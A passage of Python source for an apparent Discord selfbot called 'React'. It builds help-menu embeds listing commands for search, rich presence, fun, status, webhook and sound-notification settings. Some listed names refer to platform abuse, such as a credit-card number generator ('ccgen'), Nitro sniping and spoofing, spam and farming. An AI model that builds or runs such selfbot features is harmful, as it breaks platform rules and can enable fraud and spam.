**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('listscripts').name}** ¬ª {React.get_command('listscripts').description}''',timestamp=embed_timestamp())
        em3.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em3.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em3.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        if page == '1' or page == None:
            await embed_or_codeblock(ctx, em)


        elif page == '2':      
            await embed_or_codeblock(ctx, em2)


        elif page == '3':      
            await embed_or_codeblock(ctx, em3)


        elif page.lower() == 'all':
            await embed_or_codeblock(ctx, em)


            await embed_or_codeblock(ctx, em2)


            await embed_or_codeblock(ctx, em3)



    @React.command(usage="search", description="Shows search commands")
    async def search(ctx):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('amazonsearch').name}** ¬ª {React.get_command('amazonsearch').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('youtubesearch').name}** ¬ª {React.get_command('youtubesearch').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('googlesearch').name}** ¬ª {React.get_command('googlesearch').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('pornhubsearch').name}** ¬ª {React.get_command('pornhubsearch').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('steamsearch').name}** ¬ª {React.get_command('steamsearch').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('githubsearch').name}** ¬ª {React.get_command('githubsearch').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('stackoverflowsearch').name}** ¬ª {React.get_command('stackoverflowsearch').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wikisearch').name}** ¬ª {React.get_command('wikisearch').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('pornsearch').name}** ¬ª {React.get_command('pornsearch').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('sherlocksearch').name}** ¬ª {React.get_command('sherlocksearch').description}''',timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)



    @React.command(usage="richpresence", description="Shows Rich Presence commands")
    async def richpresence(ctx):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Rich Presence: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["rich_presence"]["enabled"] else "Disabled"}**
Custom Mode: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["rich_presence"]["custom_mode"] else "Disabled"}**
Application ID: **{json.load(open("config.json", encoding="utf-8"))["rich_presence"]["application_id"]}**
Details: **{json.load(open("config.json", encoding="utf-8"))["rich_presence"]["details"]}**
State: **{json.load(open("config.json", encoding="utf-8"))["rich_presence"]["state"]}**
Time: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["rich_presence"]["time"] else "Disabled"}**

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rpc').name}** ¬ª {React.get_command('rpc').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rpccustommode').name}** ¬ª {React.get_command('rpccustommode').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rpcappid').name}** ¬ª {React.get_command('rpcappid').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rpcdetails').name}** ¬ª {React.get_command('rpcdetails').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rpcstate').name}** ¬ª {React.get_command('rpcstate').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rpclargeimage').name}** ¬ª {React.get_command('rpclargeimage').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rpclargeimagetext').name}** ¬ª {React.get_command('rpclargeimagetext').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rpcsmallimage').name}** ¬ª {React.get_command('rpcsmallimage').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rpcsmallimagetext').name}** ¬ª {React.get_command('rpcsmallimagetext').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rpctime').name}** ¬ª {React.get_command('rpctime').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rpcbtnonelabel').name}** ¬ª {React.get_command('rpcbtnonelabel').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rpcbtnoneurl').name}** ¬ª {React.get_command('rpcbtnoneurl').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rpcbtntwolabel').name}** ¬ª {React.get_command('rpcbtntwolabel').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rpcbtntwourl').name}** ¬ª {React.get_command('rpcbtntwourl').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rpcupdate').name}** ¬ª {React.get_command('rpcupdate').description}''',timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)



    @React.command(usage="fun [Page/All]", description="Fun commands")
    async def fun(ctx, page: str=None):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Page 1/2

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('coinflip').name}** ¬ª {React.get_command('coinflip').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('cocksize').name}** ¬ª {React.get_command('cocksize').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('8ball').name}** ¬ª {React.get_command('8ball').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('dadjoke').name}** ¬ª {React.get_command('dadjoke').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('joke').name}** ¬ª {React.get_command('joke').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('chucknorrisjoke').name}** ¬ª {React.get_command('chucknorrisjoke').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wyr').name}** ¬ª {React.get_command('wyr').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('topic').name}** ¬ª {React.get_command('topic').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('trumpquote').name}** ¬ª {React.get_command('trumpquote').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('ccgen').name}** ¬ª {React.get_command('ccgen').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('911').name}** ¬ª {React.get_command('911').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('choose').name}** ¬ª {React.get_command('choose').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('nitro').name}** ¬ª {React.get_command('nitro').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('search').name}** ¬ª {React.get_command('search').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('lmgtfy').name}** ¬ª {React.get_command('lmgtfy').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('slots').name}** ¬ª {React.get_command('slots').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('tts').name}** ¬ª {React.get_command('tts').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rps').name}** ¬ª {React.get_command('rps').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('animatenick').name}** ¬ª {React.get_command('animatenick').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('stopanimatenick').name}** ¬ª {React.get_command('stopanimatenick').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('hypesquadcycle').name}** ¬ª {React.get_command('hypesquadcycle').description}''',timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        em2 = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Page 2/2

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('dice').name}** ¬ª {React.get_command('dice').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('creeper').name}** ¬ª {React.get_command('creeper').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('advice').name}** ¬ª {React.get_command('advice').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('fml').name}** ¬ª {React.get_command('fml').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('dankfarm').name}** ¬ª {React.get_command('dankfarm').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('snipe').name}** ¬ª {React.get_command('snipe').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('randomusername').name}** ¬ª {React.get_command('randomusername').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('kanyequote').name}** ¬ª {React.get_command('kanyequote').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('bored').name}** ¬ª {React.get_command('bored').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('randomnumber').name}** ¬ª {React.get_command('randomnumber').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('netflixroulette').name}** ¬ª {React.get_command('netflixroulette').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('bubblewrap').name}** ¬ª {React.get_command('bubblewrap').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('minesweeper').name}** ¬ª {React.get_command('minesweeper').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('randomemoji').name}** ¬ª {React.get_command('randomemoji').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('spoofnitro').name}** ¬ª {React.get_command('spoofnitro').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('uselessfact').name}** ¬ª {React.get_command('uselessfact').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('insult').name}** ¬ª {React.get_command('insult').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('nwordcounter').name}** ¬ª {React.get_command('nwordcounter').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('truthordare').name}** ¬ª {React.get_command('truthordare').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('spamtillyouredead').name}** ¬ª {React.get_command('spamtillyouredead').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('trivia').name}** ¬ª {React.get_command('trivia').description}''',timestamp=embed_timestamp())
        em2.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em2.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em2.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        if page == '1' or page == None:
            await embed_or_codeblock(ctx, em)


        elif page == '2':
            await embed_or_codeblock(ctx, em2)


        elif page.lower() == 'all':
            await embed_or_codeblock(ctx, em)


            await embed_or_codeblock(ctx, em2)



    @React.command(usage="status", description="Shows status commands")
    async def status(ctx):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('playing').name}** ¬ª {React.get_command('playing').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('streaming').name}** ¬ª {React.get_command('streaming').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('listening').name}** ¬ª {React.get_command('listening').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('watching').name}** ¬ª {React.get_command('watching').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('removestatus').name}** ¬ª {React.get_command('removestatus').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('online').name}** ¬ª {React.get_command('online').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('idle').name}** ¬ª {React.get_command('idle').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('dnd').name}** ¬ª {React.get_command('dnd').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('invisible').name}** ¬ª {React.get_command('invisible').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('statuscycleadd').name}** ¬ª {React.get_command('statuscycleadd').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('statuscycleclear').name}** ¬ª {React.get_command('statuscycleclear').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('statuscycle').name}** ¬ª {React.get_command('statuscycle').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('onlinestatuscycle').name}** ¬ª {React.get_command('onlinestatuscycle').description}''',timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)


        
    @React.command(usage="whookurls", description="Shows Webhook URL commands")
    async def whookurls(ctx):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Nitro: **{"Unset" if json.load(open("config.json", encoding="utf-8"))["nitro_webhook_url"] == "OPTIONAL" else "Set"}**
Giveaways: **{"Unset" if json.load(open("config.json", encoding="utf-8"))["giveaways_webhook_url"] == "OPTIONAL" else "Set"}**
Selfbot Detection: **{"Unset" if json.load(open("config.json", encoding="utf-8"))["selfbot_detection_webhook"] == "OPTIONAL" else "Set"}**
Ghostpings: **{"Unset" if json.load(open("config.json", encoding="utf-8"))["ghostping_detection_webhook"] == "OPTIONAL" else "Set"}**
Commands: **{"Unset" if json.load(open("config.json", encoding="utf-8"))["command_usage_webhook"] == "OPTIONAL" else "Set"}**
DM Deletions: **{"Unset" if json.load(open("config.json", encoding="utf-8"))["dm_delete_notify_webhook_url"] == "OPTIONAL" else "Set"}**
Privnotes: **{"Unset" if json.load(open("config.json", encoding="utf-8"))["privnote_webhook_url"] == "OPTIONAL" else "Set"}**
Watcher: **{"Unset" if json.load(open("config.json", encoding="utf-8"))["watcher_webhook_url"] == "OPTIONAL" else "Set"}**
Server Ban: **{"Unset" if json.load(open("config.json", encoding="utf-8"))["server_ban_webhook"] == "OPTIONAL" else "Set"}**
Tickets: **{"Unset" if json.load(open("config.json", encoding="utf-8"))["ticket_webhook_url"] == "OPTIONAL" else "Set"}**
Relationships: **{"Unset" if json.load(open("config.json", encoding="utf-8"))["relationship_webhook_url"] == "OPTIONAL" else "Set"}**
Role Updates: **{"Unset" if json.load(open("config.json", encoding="utf-8"))["role_update_webhook"] == "OPTIONAL" else "Set"}**
Nickname Updates: **{"Unset" if json.load(open("config.json", encoding="utf-8"))["nickname_update_webhook"] == "OPTIONAL" else "Set"}**

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('setupwhooks').name}** ¬ª {React.get_command('setupwhooks').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('webhook').name}** ¬ª {React.get_command('webhook').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wall').name}** ¬ª {React.get_command('wall').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wnitro').name}** ¬ª {React.get_command('wnitro').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wgiveaways').name}** ¬ª {React.get_command('wgiveaways').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wsbdetection').name}** ¬ª {React.get_command('wsbdetection').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wgpings').name}** ¬ª {React.get_command('wgpings').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wcmds').name}** ¬ª {React.get_command('wcmds').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wdmdels').name}** ¬ª {React.get_command('wdmdels').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wprivnotes').name}** ¬ª {React.get_command('wprivnotes').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wwatcher').name}** ¬ª {React.get_command('wwatcher').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wserverban').name}** ¬ª {React.get_command('wserverban').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wtickets').name}** ¬ª {React.get_command('wtickets').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wrelationships').name}** ¬ª {React.get_command('wrelationships').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wroleupdates').name}** ¬ª {React.get_command('wroleupdates').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('wnickname').name}** ¬ª {React.get_command('wnickname').description}''',timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)



    @React.command(usage="snotifs", description="Shows sound notifications commands")
    async def snotifs(ctx):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Nitro Redeem: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["nitro_sound"] else "Disabled"}**
Giveaway Join: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["giveaway_sound"] else "Disabled"}**
Selfbot Detection: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["selfbot_sound"] else "Disabled"}**
Ghostpings: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["ghostping_sound"] else "Disabled"}**
DM Deletions: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["dm_delete_sound"] else "Disabled"}**
Privnotes: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["privnote_sound"] else "Disabled"}**
Server Ban: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["ban_sound"] else "Disabled"}**
Tickets: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["ticket_sound"] else "Disabled"}**
Relationships: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["relationship_sound"] else "Disabled"}**
Role Updates: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["role_update_sound"] else "Disabled"}**
Nickname Updates: **{"Enabled" if json.load(open("config.json", encoding="utf-8"))["nickname_update_sound"] else "Disabled"}**

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('snsnipe').name}** ¬ª {React.get_command('snsnipe').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('sgwin').name}** ¬ª {React.get_command('sgwin').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('sprivnotes').name}** ¬ª {React.get_command('sprivnotes').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('ssbdetection').name}** ¬ª {React.get_command('ssbdetection').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('sdmdels').name}** ¬ª {React.get_command('sdmdels').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('sban').name}** ¬ª {React.get_command('sban').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('sghostping').name}** ¬ª {React.get_command('sghostping').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('srelationships').name}** ¬ª {React.get_command('srelationships').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('stickets').name}** ¬ª {React.get_command('stickets').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('sroleupdates').name}** ¬ª {React.get_command('sroleupdates').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('snickname').name}** ¬ª {React.get_command('snickname').description}''',timestamp=embed_timestamp())
